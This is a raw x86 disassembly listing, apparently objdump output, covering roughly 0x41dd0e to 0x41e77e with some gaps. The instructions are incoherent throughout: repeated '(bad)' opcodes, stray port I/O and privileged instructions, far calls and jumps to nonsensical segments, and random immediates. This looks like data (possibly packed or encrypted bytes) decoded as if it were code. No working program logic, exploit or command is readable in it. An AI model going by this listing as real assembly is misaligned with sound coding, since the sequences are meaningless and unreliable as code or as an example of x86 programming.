  41dd0e:	rcl    DWORD PTR [ebp-0x2],0xdb
  41dd12:	mov    cl,0x8c
  41dd14:	inc    edi
  41dd15:	xchg   ebp,eax
  41dd16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd17:	mov    dl,0x99
  41dd19:	mov    ?,WORD PTR [edx-0x2a]
  41dd1c:	popf   
  41dd1d:	(bad)  
  41dd1e:	pop    ebp
  41dd1f:	(bad)  
  41dd20:	dec    esi
  41dd21:	xlat   BYTE PTR ds:[ebx]
  41dd22:	or     BYTE PTR [esp+edi*8+0x47],0x4f
  41dd27:	add    eax,0xe55b0744
  41dd2c:	dec    ebp
  41dd2d:	fidivr DWORD PTR ds:[ebx+0x2c97520d]
  41dd34:	test   DWORD PTR [edi-0x2e0e01f3],0x7eae5a8f
  41dd3e:	ins    BYTE PTR es:[edi],dx
  41dd3f:	imul   esp,ecx,0x14
  41dd42:	inc    edx
  41dd43:	jp     0x41dd69
  41dd45:	enter  0xe6d4,0xb3
  41dd49:	add    al,0x61
  41dd4b:	mov    ebp,DWORD PTR [eax+0x1a1ccfb7]
  41dd51:	xor    eax,0xb4224fbf
  41dd56:	fisubr DWORD PTR [eax-0xf]
  41dd59:	test   al,0x4d
  41dd5b:	dec    esi
  41dd5c:	fmulp  st(7),st
  41dd5e:	test   ecx,esp
  41dd60:	sub    DWORD PTR [ebx-0x5f],edx
  41dd63:	sti    
  41dd64:	sub    BYTE PTR [eax],0x5e
  41dd67:	jg     0x41dd4d
  41dd69:	idiv   DWORD PTR [esp+edi*4]
  41dd6c:	xchg   edx,eax
  41dd6d:	or     DWORD PTR [edi+0x26553683],eax
  41dd73:	iret   
  41dd74:	call   0x1f05:0x4e7410b1
  41dd7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd7c:	xor    al,BYTE PTR [ecx-0x6b]
  41dd7f:	gs dec edi
  41dd81:	pop    ds
  41dd82:	and    al,0xe3
  41dd84:	in     eax,dx
  41dd85:	xor    eax,0xf0c21eb8
  41dd8a:	scas   al,BYTE PTR es:[edi]
  41dd8b:	add    esp,edi
  41dd8d:	mov    esi,0x833dbdbb
  41dd92:	mov    ds:0xcda60786,al
  41dd97:	pop    ebp
  41dd98:	lds    ebx,FWORD PTR [ecx+0x4796113b]
  41dd9e:	and    ebp,DWORD PTR [edx]
  41dda0:	sbb    dl,BYTE PTR [esi-0x9]
  41dda3:	in     al,dx
  41dda4:	ja     0x41de19
  41dda6:	in     eax,0x73
  41dda8:	bound  eax,QWORD PTR [edx+ebx*2-0x76]
  41ddac:	push   ebx
  41ddad:	fcmovne st,st(7)
  41ddaf:	ds aas 
  41ddb1:	loopne 0x41dd8f
  41ddb3:	fldcw  WORD PTR [edi-0x6ad0bbf]
  41ddb9:	pop    ecx
  41ddba:	clc    
  41ddbb:	pop    eax
  41ddbc:	mov    ebx,0x1fb96453
  41ddc1:	sldt   WORD PTR [eax]
	...
  41de34:	pop    es
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	rol    DWORD PTR [edi],1
  41de42:	stc    
  41de43:	mov    al,0xcc
  41de45:	inc    ecx
  41de46:	add    DWORD PTR [eax],eax
  41de48:	test   BYTE PTR [eax],0x0
  41de4b:	add    BYTE PTR [edi],al
  41de4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de4e:	jg     0x41dea3
  41de50:	sbb    bh,ah
  41de52:	xchg   edx,eax
  41de53:	adc    eax,0x17c00b51
  41de58:	repnz aam 0xfa
  41de5b:	inc    esp
  41de5c:	loop   0x41deba
  41de5e:	mov    eax,0xc4e96661
  41de63:	mov    ?,WORD PTR [ecx]
  41de65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de66:	popa   
  41de67:	fimul  DWORD PTR [esp+ebx*8-0x7974c88f]
  41de6e:	aam    0x14
  41de70:	push   es
  41de71:	mov    eax,0x5648bf84
  41de76:	iret   
  41de77:	ss and al,0xf9
  41de7a:	sar    BYTE PTR [esi],cl
  41de7c:	xchg   esi,eax
  41de7d:	lods   eax,DWORD PTR ds:[esi]
  41de7e:	adc    BYTE PTR [ebx],0x8a
  41de81:	mov    cl,BYTE PTR [ebx]
  41de83:	mov    ah,BYTE PTR [edx-0x43280f3b]
  41de89:	aas    
  41de8a:	fnsave [ecx+0x1b]
  41de8d:	aam    0xf0
  41de8f:	adc    eax,0x7dbfb057
  41de94:	inc    esi
  41de95:	sbb    ebp,eax
  41de97:	(bad)  gs:[ebx+ebp*8+0x3c22d7f5]
  41de9f:	jno    0x41de91
  41dea1:	fwait
  41dea2:	mov    ch,0xfe
  41dea4:	nop
  41dea5:	adc    al,0x30
  41dea7:	jae    0x41de66
  41dea9:	jnp    0x41df06
  41deab:	sbb    ebx,DWORD PTR [edx-0x498654ce]
  41deb1:	mov    ebp,0x39746fc5
  41deb6:	inc    esi
  41deb7:	out    dx,eax
  41deb8:	dec    edx
  41deb9:	cdq    
  41deba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41debb:	sub    bh,0x79
  41debe:	xor    ch,BYTE PTR [edx]
  41dec0:	lds    eax,FWORD PTR [ecx-0x5f0fc85d]
  41dec6:	gs mov eax,0x33a1dd
  41decc:	jns    0x41ded6
  41dece:	mov    gs,WORD PTR [esi-0x30dfb690]
  41ded4:	cmc    
  41ded5:	scas   eax,DWORD PTR es:[edi]
  41ded6:	xchg   edi,eax
  41ded7:	mov    esp,0x791d89e5
  41dedc:	ret    
  41dedd:	pop    eax
  41dede:	mov    dl,0xd9
  41dee0:	neg    bh
  41dee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dee3:	adc    BYTE PTR [esi-0x1c],dh
  41dee6:	push   ss
  41dee7:	sbb    al,0xbc
  41dee9:	and    al,0xc5
  41deeb:	jbe    0x41dee9
  41deed:	popa   
  41deee:	and    ch,BYTE PTR [edx]
  41def0:	ret    0xfb36
  41def3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41def4:	rol    BYTE PTR [esi],0x81
  41def7:	repz iret 
  41def9:	into   
  41defa:	push   esp
  41defb:	stc    
  41defc:	in     eax,dx
  41defd:	adc    al,0xf
  41deff:	cli    
  41df00:	inc    ecx
  41df01:	inc    ecx
  41df02:	mov    al,0x1c
  41df05:	sbb    DWORD PTR [edx],ebx
  41df07:	add    BYTE PTR ds:0xb94922d9,ah
  41df0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df0e:	scas   al,BYTE PTR es:[edi]
  41df0f:	dec    DWORD PTR [eax-0x72]
  41df12:	inc    eax
  41df13:	test   al,0x3b
  41df15:	add    ebp,DWORD PTR [edi+edx*8]
  41df18:	outs   dx,BYTE PTR ds:[esi]
  41df1a:	fbstp  TBYTE PTR [esi+0x5afa82c0]
  41df20:	push   es
  41df21:	pop    ss
  41df22:	mov    eax,ds:0x593e1646
  41df27:	ins    BYTE PTR es:[edi],dx
  41df28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df29:	and    DWORD PTR [edi],ebx
  41df2b:	(bad)  
  41df2d:	pushf  
  41df2e:	dec    esi
  41df2f:	or     eax,0x3241a827
  41df34:	jne    0x41dfb1
  41df36:	hlt    
  41df37:	cdq    
  41df38:	in     al,0x62
  41df3a:	stos   BYTE PTR es:[edi],al
  41df3b:	and    al,0x3e
  41df3d:	iret   
  41df3e:	mov    ebx,0x3f543f
	...
  41dfb3:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	push   edi
  41dfc1:	fstp   QWORD PTR [eax]
  41dfc3:	mov    dl,0x42
  41dfc6:	add    DWORD PTR [eax],eax
  41dfc8:	test   BYTE PTR [eax],0x0
  41dfcb:	add    ah,al
  41dfcd:	add    edi,DWORD PTR [eax]
  41dfcf:	mov    esp,0x8ad05c67
  41dfd4:	sbb    al,0x84
  41dfd6:	jecxz  0x41e04e
  41dfd8:	xor    al,0x8e
  41dfda:	sbb    DWORD PTR [ebp+esi*8+0x31f3e302],edi
  41dfe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfe2:	jae    0x41dfc3
  41dfe4:	pop    edx
  41dfe5:	jb     0x41dfbc
  41dfe7:	inc    ebp
  41dfe8:	dec    eax
  41dfe9:	inc    edi
  41dfea:	push   eax
  41dfeb:	pusha  
  41dfec:	leave  
  41dfed:	ret    
  41dfee:	icebp  
  41dfef:	ja     0x41e02d
  41dff1:	add    BYTE PTR [eax],ah
  41dff3:	ja     0x41df87
  41dff5:	frstor [ebx+0x4d]
  41dff8:	jmp    0x5da2:0xb72c986b
  41dfff:	lods   eax,DWORD PTR cs:[esi]
  41e001:	jo     0x41e012
  41e003:	ja     0x41df87
  41e005:	shr    DWORD PTR [ecx+0x640c56],cl
  41e00b:	addr16 cbw 
  41e00e:	xor    al,BYTE PTR [edx-0x77e0d0f2]
  41e014:	enter  0x20c1,0xf7
  41e018:	mov    edi,0xe278ee0b
  41e01d:	sti    
  41e01e:	rcl    dh,0x9d
  41e021:	cli    
  41e022:	adc    cl,BYTE PTR ds:0x838ee665
  41e028:	mov    bl,0xfc
  41e02a:	repz adc eax,0xcfa2d709
  41e030:	add    eax,0xd1f67ac1
  41e035:	or     BYTE PTR [eax+0x7d],ch
  41e038:	jl     0x41e096
  41e03a:	hlt    
  41e03b:	pop    eax
  41e03c:	xchg   ebp,eax
  41e03d:	and    ebx,DWORD PTR [eax]
  41e03f:	cdq    
  41e040:	pop    esi
  41e041:	mov    eax,0xaf1422e
  41e046:	adc    dl,BYTE PTR [ebx-0x1f]
  41e049:	jecxz  0x41dfde
  41e04b:	out    dx,al
  41e04c:	cmp    eax,0xc797e4fc
  41e051:	ins    DWORD PTR es:[edi],dx
  41e052:	cmp    ch,BYTE PTR ds:0x7377bf24
  41e058:	fisub  WORD PTR [eax-0x7d834a43]
  41e05e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e05f:	sub    DWORD PTR [ecx+0x4eef687],esi
  41e065:	mov    WORD PTR [ecx+0x4c],gs
  41e068:	jle    0x41e0c6
  41e06a:	pop    ebx
  41e06b:	inc    esi
  41e06c:	dec    esi
  41e06d:	aas    
  41e06e:	test   al,0xc8
  41e070:	sub    eax,0x7657a05
  41e075:	and    bh,0xe5
  41e078:	ja     0x41e065
  41e07a:	add    eax,0x440bb7f1
  41e07f:	stc    
  41e080:	xchg   edi,eax
  41e081:	jne    0x41e018
  41e083:	ins    BYTE PTR es:[edi],dx
  41e084:	mov    cs,WORD PTR ds:0xbcbd3d9d
  41e08a:	sar    BYTE PTR [edx*8-0x3aa8527c],1
  41e091:	(bad)  
  41e093:	push   ecx
  41e094:	jae    0x41e098
  41e096:	es test eax,0x21a9d6a
  41e09c:	in     eax,dx
  41e09d:	loop   0x41e08a
  41e09f:	bound  edi,QWORD PTR [ecx-0x1cdc671c]
  41e0a5:	push   esi
  41e0a6:	push   esi
  41e0a7:	std    
  41e0a8:	scas   al,BYTE PTR es:[edi]
  41e0a9:	xor    DWORD PTR ds:0x6badb110,edi
  41e0af:	mov    DWORD PTR [ebx+edx*1-0x6d],edx
  41e0b3:	shl    BYTE PTR [ecx+0x26],cl
  41e0b6:	inc    ecx
  41e0b7:	cli    
  41e0b8:	pushf  
  41e0b9:	add    dl,al
  41e0bb:	inc    ecx
  41e0bc:	xor    ecx,esi
  41e0be:	or     ecx,DWORD PTR [ecx]
  41e0c0:	jae    0x41e0a0
	...
  41e132:	add    BYTE PTR [eax],al
  41e134:	push   eax
  41e135:	ret    
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	outs   dx,DWORD PTR ds:[esi]
  41e141:	inc    esp
  41e142:	cmp    esi,DWORD PTR [ebp+0x143b8]
  41e148:	test   BYTE PTR [eax],0x0
  41e14b:	add    BYTE PTR [eax],dh
  41e14d:	push   ecx
  41e14e:	nop
  41e14f:	adc    edi,esp
  41e151:	and    BYTE PTR [esi-0x7855c8d4],ch
  41e157:	sub    al,0x5a
  41e159:	mov    bl,0xc0
  41e15b:	xor    al,bl
  41e15d:	gs sbb esp,ebx
  41e160:	popa   
  41e161:	dec    eax
  41e162:	repnz xor eax,0xfbe3ed4f
  41e168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e169:	mov    edi,0xc7c4eab5
  41e16e:	scas   eax,DWORD PTR es:[edi]
  41e16f:	js     0x41e124
  41e171:	xchg   ecx,eax
  41e172:	adc    al,0x28
  41e174:	push   ecx
  41e175:	rcl    DWORD PTR [esi],1
  41e177:	fiadd  DWORD PTR ds:0x57bfe61f
  41e17d:	add    dl,BYTE PTR [edx-0x3483b3aa]
  41e183:	xchg   ebp,eax
  41e184:	sub    al,0x5
  41e186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e187:	push   ebx
  41e188:	fistp  QWORD PTR [ecx+0x60c72926]
  41e18e:	mov    ebx,DWORD PTR [edx+0x33]
  41e191:	sub    DWORD PTR [eax-0xc],esi
  41e194:	out    0xa5,al
  41e196:	cmp    BYTE PTR [ecx],0x1a
  41e199:	sub    eax,0x89be74a9
  41e19e:	push   ebx
  41e19f:	mov    dl,0xc8
  41e1a2:	xor    eax,0xdfb077fe
  41e1a7:	fistp  QWORD PTR [ebp+0x6d]
  41e1aa:	or     dl,BYTE PTR [edi]
  41e1ac:	sar    DWORD PTR [esi],cl
  41e1ae:	shr    BYTE PTR [edi-0x69385183],1
  41e1b4:	jmp    0x41e1fe
  41e1b6:	mov    ebp,0x8faa673d
  41e1bb:	fidivr DWORD PTR [ebx]
  41e1bd:	imul   edi
  41e1bf:	mov    dl,0xf7
  41e1c1:	stc    
  41e1c2:	cs popf 
  41e1c4:	ins    BYTE PTR es:[edi],dx
  41e1c5:	push   0xfffffff5
  41e1c7:	mov    eax,ds:0xa9c7405
  41e1cc:	pop    ss
  41e1cd:	lds    ecx,FWORD PTR [edi+esi*8]
  41e1d0:	ja     0x41e23e
  41e1d2:	outs   dx,DWORD PTR ds:[esi]
  41e1d3:	or     al,0x35
  41e1d5:	fimul  DWORD PTR [esi]
  41e1d7:	(bad)  
  41e1d8:	repz cdq 
  41e1da:	mov    ebp,0x6801b19
  41e1df:	xor    BYTE PTR [ecx],bh
  41e1e1:	sub    BYTE PTR [edx+0xf965445],dl
  41e1e7:	jb     0x41e17a
  41e1e9:	out    0x72,al
  41e1eb:	nop
  41e1ec:	lods   al,BYTE PTR gs:[esi]
  41e1ee:	daa    
  41e1ef:	in     eax,dx
  41e1f0:	fdivr  DWORD PTR [edi-0x60d18e7b]
  41e1f6:	out    dx,al
  41e1f7:	adc    dl,BYTE PTR [esi+0x63d3d21d]
  41e1fd:	adc    eax,0x28f3eef5
  41e202:	adc    edx,DWORD PTR [eax-0x53b3c3bc]
  41e208:	aam    0x42
  41e20a:	arpl   si,sp
  41e20c:	test   BYTE PTR [edx],al
  41e20e:	dec    ebx
  41e20f:	jb     0x41e254
  41e211:	mov    ch,0xdc
  41e213:	and    eax,0x99e02bc3
  41e218:	cmp    eax,0x1be8135e
  41e21d:	push   es
  41e21e:	xor    BYTE PTR [eax],bl
  41e220:	push   ebp
  41e221:	mov    ecx,0x37c684fe
  41e226:	out    0xf2,al
  41e228:	out    dx,eax
  41e229:	pop    edx
  41e22a:	cmp    BYTE PTR [esp+edi*1-0x66],bh
  41e22e:	mov    bh,0xdd
  41e230:	jbe    0x41e242
  41e232:	push   0x32d5f821
  41e237:	out    dx,al
  41e238:	(bad)  
  41e23a:	or     dh,BYTE PTR [esi+0x7b]
  41e23d:	or     esi,edi
  41e23f:	mov    ebp,0x6bce
	...
  41e2b4:	inc    BYTE PTR [eax+0x7dff54f9]
  41e2ba:	jmp    FWORD PTR [edx+0x7b6356a5]
  41e2c0:	push   eax
  41e2c1:	pop    ebx
  41e2c2:	mov    ebp,0x144aedd
  41e2c7:	add    dh,dh
  41e2c9:	add    BYTE PTR [eax],al
  41e2cb:	add    dh,dl
  41e2cd:	cmp    BYTE PTR [esi],dh
  41e2cf:	or     edx,DWORD PTR [edx]
  41e2d1:	xlat   BYTE PTR ds:[ebx]
  41e2d2:	test   eax,0xd821d220
  41e2d7:	lods   al,BYTE PTR ds:[esi]
  41e2d8:	add    cl,BYTE PTR [esi+0x77]
  41e2db:	and    eax,0x9e4c4d40
  41e2e0:	mov    ecx,0x510d55f4
  41e2e5:	or     DWORD PTR [eax+0x42c515b5],esi
  41e2eb:	les    ecx,FWORD PTR [edx+0x7cd1a9a8]
  41e2f1:	and    al,0x67
  41e2f3:	in     eax,dx
  41e2f4:	test   eax,0x2315b61f
  41e2f9:	sbb    eax,0x532335b8
  41e2fe:	push   esp
  41e2ff:	mov    al,0x34
  41e301:	push   esp
  41e302:	imul   esp,ecx,0x228c1bee
  41e308:	xor    eax,0xae1f40d1
  41e30d:	add    esp,ebx
  41e30f:	and    ecx,esp
  41e311:	cmp    BYTE PTR [ebx+ecx*2+0x278ea74e],0xfa
  41e319:	bound  eax,QWORD PTR [ebx-0x31]
  41e31c:	shr    DWORD PTR [edx],cl
  41e31e:	push   edx
  41e31f:	mov    edi,0x11e8827e
  41e324:	(bad)  
  41e326:	int3   
  41e327:	xor    ch,BYTE PTR [edx-0x75]
  41e32a:	xor    BYTE PTR [ecx-0x5e31f2fd],0xa2
  41e331:	adc    cl,BYTE PTR [ecx+0x7d]
  41e334:	shl    eax,1
  41e336:	icebp  
  41e337:	fsub   st,st(7)
  41e339:	in     al,dx
  41e33a:	aas    
  41e33b:	lods   al,BYTE PTR ds:[esi]
  41e33c:	mov    cl,0xe0
  41e33e:	test   DWORD PTR [ecx],ebp
  41e340:	(bad)  
  41e341:	loopne 0x41e2e1
  41e343:	mov    ds:0xd363ae59,eax
  41e348:	in     al,0x77
  41e34a:	je     0x41e308
  41e34c:	xchg   ecx,eax
  41e34d:	scas   al,BYTE PTR es:[edi]
  41e34e:	xlat   BYTE PTR fs:[ebx]
  41e350:	out    dx,al
  41e351:	pop    edi
  41e352:	push   ss
  41e353:	jmp    0x1a8c7da4
  41e358:	jbe    0x41e37d
  41e35a:	dec    edi
  41e35b:	int3   
  41e35c:	jmp    0xbc3b:0xa69cb370
  41e363:	in     eax,dx
  41e364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e365:	nop
  41e366:	sub    ebx,ebp
  41e368:	aaa    
  41e369:	dec    eax
  41e36a:	clc    
  41e36b:	xchg   ebp,eax
  41e36c:	popa   
  41e36d:	js     0x41e366
  41e36f:	test   al,0x67
  41e371:	add    al,0x21
  41e373:	inc    ecx
  41e374:	sahf   
  41e375:	leave  
  41e376:	mov    ds:0x363228b3,eax
  41e37b:	cli    
  41e37c:	fadd   DWORD PTR [eax-0xbd4151]
  41e382:	xchg   edi,eax
  41e383:	rcl    bl,cl
  41e385:	sbb    DWORD PTR [esi+0x5c],ebx
  41e388:	call   0xae0528d2
  41e38d:	or     al,0x85
  41e38f:	daa    
  41e390:	stc    
  41e391:	rol    BYTE PTR [esi],0xb2
  41e394:	xor    ebx,DWORD PTR [ebp-0x18]
  41e397:	push   edi
  41e398:	inc    esp
  41e399:	ins    DWORD PTR es:[edi],dx
  41e39a:	inc    ecx
  41e39b:	push   eax
  41e39c:	sbb    dl,BYTE PTR [ecx+0x6cbc07e3]
  41e3a2:	dec    esi
  41e3a3:	mov    esi,DWORD PTR [edi-0x21]
  41e3a6:	repz mov esi,0x6d83fe74
  41e3ac:	repz xor bl,BYTE PTR [ecx+0x705f931b]
  41e3b3:	jmp    0xcedacf0a
  41e3b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3b9:	mov    al,0xe9
  41e3bb:	aad    0xa8
  41e3bd:	pop    edi
  41e3be:	cmp    bl,BYTE PTR [eax+0x384b]
	...
  41e434:	div    BYTE PTR [esi]
  41e436:	rcl    BYTE PTR [edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0x8028fead,al
  41e442:	popf   
  41e443:	mov    cl,0xa4
  41e445:	inc    ebp
  41e446:	add    DWORD PTR [eax],eax
  41e448:	test   BYTE PTR [eax],0x0
  41e44b:	add    BYTE PTR [ecx],dl
  41e44d:	sbb    eax,0xae6402d8
  41e452:	pop    esp
  41e453:	adc    dh,BYTE PTR es:[ebx]
  41e456:	xchg   edx,eax
  41e457:	sbb    DWORD PTR [ebx-0x52],ecx
  41e45a:	and    bh,BYTE PTR [ecx]
  41e45c:	push   ss
  41e45d:	test   BYTE PTR ss:[eax-0x15],0x92
  41e462:	sbb    al,0x9d
  41e464:	fs ret 0x68b6
  41e468:	push   edx
  41e469:	dec    ebp
  41e46a:	fdivr  QWORD PTR [edx+0x4c]
  41e46d:	mov    al,al
  41e46f:	add    al,ah
  41e471:	call   0x2a55:0x29621915
  41e478:	ins    DWORD PTR es:[edi],dx
  41e479:	cmc    
  41e47a:	dec    eax
  41e47b:	test   ebp,edi
  41e47d:	sub    DWORD PTR [edx+0x681e5d6f],esp
  41e483:	jne    0x41e4d8
  41e485:	aad    0x1d
  41e487:	fimul  DWORD PTR [edi]
  41e489:	mov    eax,ds:0x54de9f5b
  41e48e:	sahf   
  41e48f:	fdivr  QWORD PTR [ebx]
  41e491:	fstp   DWORD PTR [edi+0x5b]
  41e494:	retf   0x90db
  41e497:	pop    es
  41e498:	and    esi,DWORD PTR [eax]
  41e49a:	fbstp  TBYTE PTR [ecx+0x62cb7752]
  41e4a0:	fs mov al,0xc8
  41e4a3:	sub    eax,0x269cfe55
  41e4a8:	mov    eax,ds:0xcfd3d9c3
  41e4ad:	fild   WORD PTR cs:[esi-0x8177c59]
  41e4b4:	and    edi,DWORD PTR [ecx-0x67]
  41e4b7:	nop
  41e4b8:	cmp    al,0xd7
  41e4ba:	mov    ds:0x44a47628,eax
  41e4bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4c0:	es push cs
  41e4c2:	fild   QWORD PTR [eax]
  41e4c4:	adc    DWORD PTR [eax+0x287f0d20],0xffffffea
  41e4cb:	daa    
  41e4cc:	clc    
  41e4cd:	aam    0x15
  41e4cf:	xor    al,0x60
  41e4d1:	mov    eax,0xeaa6f8f3
  41e4d6:	stos   BYTE PTR es:[edi],al
  41e4d7:	loopne 0x41e534
  41e4d9:	add    ebp,ebp
  41e4db:	sub    eax,esi
  41e4dd:	fst    DWORD PTR [esi+0x1487a89c]
  41e4e3:	(bad)  
  41e4e5:	mov    ds,ebx
  41e4e7:	popf   
  41e4e8:	dec    eax
  41e4e9:	retf   
  41e4ea:	pop    ss
  41e4eb:	retf   
  41e4ec:	fidivr WORD PTR [ebp+ecx*2+0x548a5eba]
  41e4f3:	(bad)  
  41e4f5:	jle    0x41e48b
  41e4f7:	scas   eax,DWORD PTR es:[edi]
  41e4f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4f9:	popa   
  41e4fa:	sti    
  41e4fb:	add    dh,bl
  41e4fd:	jle    0x41e4e7
  41e4ff:	inc    esi
  41e500:	lods   al,BYTE PTR ds:[esi]
  41e501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e502:	imul   edi,DWORD PTR [ebx],0xd3486ca
  41e508:	outs   dx,DWORD PTR ds:[esi]
  41e509:	pop    ebp
  41e50a:	(bad)  
  41e50b:	in     al,dx
  41e50c:	stos   BYTE PTR es:[edi],al
  41e50d:	retf   0x2193
  41e510:	lods   al,BYTE PTR ds:[esi]
  41e511:	aaa    
  41e512:	add    al,0xf0
  41e514:	mov    esi,0x1119ac97
  41e519:	add    DWORD PTR [edi+0x51],ecx
  41e51c:	ja     0x41e4ef
  41e51e:	jno    0x41e57e
  41e520:	ds stos DWORD PTR es:[edi],eax
  41e522:	mov    al,ds:0x86435135
  41e527:	and    DWORD PTR [ebx+0x58],ebx
  41e52a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e52b:	les    edi,FWORD PTR [edx]
  41e52d:	mov    esp,0xc44ed3ab
  41e532:	jnp    0x41e4fc
  41e534:	int    0x8e
  41e536:	pop    esp
  41e537:	xor    DWORD PTR [edx+0xd97d101],ecx
  41e53d:	nop
  41e53e:	retf   0x93f5
  41e541:	popf   
	...
  41e5b2:	add    BYTE PTR [eax],al
  41e5b4:	jl     0x41e54f
  41e5b6:	dec    esp
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz test al,0xca
  41e5c2:	in     eax,0x9
  41e5c4:	call   0x0:0xf6000146
  41e5cb:	add    BYTE PTR [edi],cl
  41e5cd:	(bad)  
  41e5ce:	(bad)  
  41e5cf:	stc    
  41e5d0:	lds    esi,FWORD PTR [edx-0x27f18b86]
  41e5d6:	add    eax,0xee068dcf
  41e5db:	or     edi,DWORD PTR [edi+0x3d]
  41e5de:	or     eax,0xe1048928
  41e5e3:	add    DWORD PTR [esp+edi*1],0xabf3aa5a
  41e5ea:	ins    DWORD PTR es:[edi],dx
  41e5eb:	outs   dx,BYTE PTR ds:[esi]
  41e5ec:	cmp    eax,DWORD PTR [esi+0x69]
  41e5ef:	mov    esp,0x319df12f
  41e5f4:	(bad)  [ebp-0x62]
  41e5f7:	leave  
  41e5f8:	add    ebx,edi
  41e5fa:	mov    ds:0x91545694,al
  41e5ff:	mov    ds:0xdcd6dbed,al
  41e604:	fimul  WORD PTR [edx]
  41e606:	out    dx,eax
  41e607:	mov    ah,0xfd
  41e609:	loopne 0x41e5c8
  41e60b:	bound  edi,QWORD PTR [ebp+0x40610e72]
  41e611:	push   ss
  41e612:	aaa    
  41e613:	test   BYTE PTR [ecx],bh
  41e615:	sub    ecx,DWORD PTR [edi+0x5c7dcd77]
  41e61b:	ja     0x41e5ac
  41e61d:	cmp    BYTE PTR [esi],al
  41e61f:	retf   
  41e620:	call   0x2a05cc1
  41e625:	cmp    al,0xf6
  41e627:	or     eax,0x535076c5
  41e62c:	mov    cs,WORD PTR [ebx]
  41e62e:	imul   eax,DWORD PTR [edi+0x36851a42],0xffffffbf
  41e635:	cmp    BYTE PTR ds:0x61484c4a,cl
  41e63b:	ds push edx
  41e63d:	jo     0x41e5e0
  41e63f:	jmp    0x41e613
  41e641:	jmp    FWORD PTR [esi+0x72e0d6ec]
  41e647:	jns    0x41e612
  41e649:	fldcw  WORD PTR [esi-0x163eb49c]
  41e64f:	jge    0xd76509ce
  41e655:	mov    WORD PTR [edi-0x13b661f5],ds
  41e65b:	enter  0x796b,0x38
  41e65f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e660:	jbe    0x41e657
  41e662:	stc    
  41e663:	loop   0x41e634
  41e665:	mov    ebp,0x9b153027
  41e66a:	add    BYTE PTR [esi-0x7f],bh
  41e66d:	mov    ebx,es
  41e66f:	iret   
  41e670:	jnp    0x41e5fb
  41e672:	loop   0x41e6a0
  41e674:	and    dl,BYTE PTR [ecx+0x61]
  41e677:	call   FWORD PTR [edx+0x393b7f93]
  41e67d:	xchg   DWORD PTR [edi+0x65],esi
  41e680:	mov    eax,0xbdc91842
  41e685:	push   ss
  41e686:	cmp    eax,0x95ca903e
  41e68b:	jns    0x41e6b9
  41e68d:	push   ss
  41e68e:	mov    dl,0xdf
  41e690:	and    ebx,ecx
  41e692:	int3   
  41e693:	add    al,0x66
  41e695:	dec    eax
  41e696:	lea    ebx,[ecx+eax*1]
  41e699:	pop    ds
  41e69a:	jl     0x41e634
  41e69c:	xor    ecx,esi
  41e69e:	enter  0x566c,0x0
  41e6a2:	sub    esi,ebx
  41e6a4:	das    
  41e6a5:	clc    
  41e6a6:	ins    BYTE PTR es:[edi],dx
  41e6a7:	std    
  41e6a8:	inc    ebx
  41e6a9:	imul   edi,DWORD PTR [edx+0x6e],0xffffffac
  41e6ad:	xchg   DWORD PTR [edx-0x14d534f8],ebp
  41e6b3:	add    BYTE PTR [edi+0x2f],ch
  41e6b6:	sbb    al,0xee
  41e6b8:	sbb    eax,0x6c449a7e
  41e6bd:	out    0xe1,al
  41e6bf:	hlt    
  41e6c0:	inc    edx
  41e6c1:	or     DWORD PTR [eax],eax
	...
  41e733:	add    BYTE PTR [esi+ecx*8],ah
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx-0x336ae8ca]
  41e744:	nop
  41e745:	inc    edi
  41e746:	add    DWORD PTR [eax],eax
  41e748:	test   BYTE PTR [eax],0x0
  41e74b:	add    BYTE PTR [edi-0x7e],ah
  41e74e:	loop   0x41e765
  41e750:	ret    0x574e
  41e753:	xchg   edi,eax
  41e755:	fidivr DWORD PTR [esi-0x6eb87152]
  41e75b:	ss mov edx,0x70363b56
  41e761:	xchg   ebp,eax
  41e762:	ja     0x41e77a
  41e764:	push   esp
  41e765:	dec    ebx
  41e766:	aaa    
  41e767:	dec    ebx
  41e768:	jne    0x41e7ab
  41e76a:	enter  0x13b4,0xa4
  41e76e:	push   ebx
  41e76f:	or     DWORD PTR [edx+0x30],esp
  41e772:	ret    
  41e773:	rcr    DWORD PTR [esi+0x6686a369],1
  41e779:	mov    ds:0x6f4a2420,al
  41e77e:	aas    
